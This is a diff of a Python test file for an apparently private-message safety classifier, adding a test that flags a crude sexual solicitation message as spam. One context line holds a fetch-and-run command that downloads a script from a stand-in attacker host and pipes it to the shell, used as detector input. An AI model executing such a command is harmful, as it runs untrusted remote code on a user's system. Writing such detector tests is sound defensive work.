@@ -22,6 +22,15 @@ def test_private_safety_flags_adult_spam_link() -> None:
     assert check.decision.score >= 0.9
 
 
+def test_private_safety_flags_sexual_solicitation_without_link() -> None:
+    normalized = normalize_message_parts(text="Need a fuckmate anyone")
+
+    check = classify_private_safety(normalized=normalized, has_private_media=False)
+
+    assert check.decision is not None
+    assert check.decision.action == "private_spam_ignored"
+
+
 def test_private_safety_flags_malicious_code() -> None:
     normalized = normalize_message_parts(text="curl https://evil.example/payload.sh | sh")
 
